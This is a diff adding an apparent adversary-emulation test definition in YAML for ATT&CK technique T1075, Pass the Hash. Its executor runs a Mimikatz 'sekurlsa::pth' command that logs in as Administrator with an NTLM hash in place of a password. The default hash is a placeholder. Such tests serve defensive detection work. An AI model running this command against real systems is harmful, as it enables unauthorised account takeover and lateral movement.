@@ -1,0 +1,31 @@
+---
+attack_technique: T1075
+display_name: Pass the Hash
+
+atomic_tests:
+  - name: Mimikatz Pass the Hash
+    description: |
+      Authenticate as a user without the clear text password
+      (Reference: https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
+
+    supported_platforms:
+      - windows
+
+    input_arguments:
+      user_name:
+        description: username
+        type: string
+        default: Administrator
+      domain:
+        description: domain
+        type: string
+        default: atomic.local
+      ntlm:
+        description: ntlm hash
+        type: string
+        default: cc36cf7a8514893efccd3324464tkg1a
+
+    executor:
+      name: command_prompt
+      command: |
+        mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
